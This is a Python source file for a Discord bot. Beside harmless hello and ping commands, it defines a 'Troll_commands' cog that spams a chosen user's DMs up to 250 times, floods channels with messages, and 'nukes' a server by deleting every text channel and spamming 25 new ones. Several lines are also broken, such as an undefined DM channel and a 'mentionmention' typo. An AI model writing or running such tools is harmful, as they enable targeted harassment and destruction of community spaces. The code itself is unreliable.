import asyncio
from typing import Optional
import discord
from discord import Forbidden
from discord.ext import commands, bridge


class Simple_commands(commands.Cog):

  def __init__(self, client):
    self.client = client

  @bridge.bridge_command(description="says hello to the user")
  async def hello(self, ctx):
    await ctx.reply(content=f"Hello! {ctx.author.mention}!")

  @bridge.bridge_command(description='Pong!')
  async def ping(self, ctx):
    try:
      # Assuming you are using discord.Client
      latency = round(self.client.latency * 1000, 2)
      await ctx.reply(content=f"Pong! Responded in {latency}ms!")
    except Exception as e:
      print(e)


class Troll_commands(commands.Cog):

  def __init__(self, client):
    self.client = client

  @bridge.bridge_command(name="send_dm",
                         amount="The amount of messages to send",
                         username='member to spam dm',
                         send_message="What do you want to send to this user?")
  async def spam_dm(self, ctx, username: discord.User, send_message: str,
                    amount: Optional[int]):
    try:
      if amount is None:
        amount = 1
        try:
          dm_channel = await username.create_dm()
        except Forbidden:
          await ctx.reply("I don't have permission to send DMs to that user")
          return
      elif amount > 250:
        await ctx.reply(
            content=
            f"{ctx.author.mention} :warning: Amount must be less than 250 :warning:"
        )
        return

      await ctx.reply(content=f"Spamming {username} {amount} times!")

      # Send messages in the existing DM channel
      for i in range(amount):
        await dm_channel.send(f"{send_message} {username.mention}")
        await asyncio.sleep(0.6)

      await ctx.edit(
          content=f"Sent {amount} DMs to {username} ({ctx.ctx.author.mention})"
      )

    except Forbidden:
      await ctx.edit(
          content=
          f"{ctx.author.mentionmention} I can't spam {username} {amount} times"
      )

  @bridge.bridge_command(
      name="send_channel",
      amount="The amount of messages to send",
      send_message="What do you want to send to this channel?")
  async def send(self, ctx, send_message: str, channel: discord.TextChannel,
                 amount: Optional[int]):
    try:
      if amount is None:
        await ctx.reply(content=f"sent your message to {channel}",
                       ephemeral=True)
        await channel.send(send_message)
        return
      if amount is not None and amount > 250:
        await ctx.reply(
            content=
            f"{ctx.user.mention} :warning: Amount must be less than 250 :warning:"
        )
      await ctx.reply(content=f"Sending {amount} messages to {channel}!")
      for i in range(amount):
        await channel.send(send_message)
        await asyncio.sleep(0.6)
    except Exception as e:
      print(e)

  @bridge.bridge_command(description="nukes a server ",
                         channel_message="message to send in new channe",
                         administrator=True)
  async def nuke(self, ctx, channel_names: str, channel_message: str):
    try:
      server = ctx.guild
      text_channels = [
          channel for channel in server.channels
          if isinstance(channel, discord.TextChannel)
      ]
      for channel in text_channels:
        await channel.delete()
      for i in range(25):
        new_channel = await server.create_text_channel(channel_names)
        for j in range(20):
          await new_channel.send(channel_message)
          await asyncio.sleep(0.5)
    except Forbidden:
      await ctx.send(content="I don't have permission to delete that channel",
                     ephemeral=True)

  @bridge.bridge_command(aliases=["del all", "del_all", "del-all","delete_channels"],description="Deletes all textchannels in the server",
                         administrator=True)
  async def delete_all(self, ctx):
    server = ctx.guild
    # Get a list of all text channels in the guild
    text_channels = [
        channel for channel in server.channels
        if isinstance(channel, discord.TextChannel)
    ]
    for channel in text_channels:
      await channel.delete()
    await server.create_text_channel("general")


def setup(client):
  client.add_cog(Simple_commands(client))
  client.add_cog(Troll_commands(client))
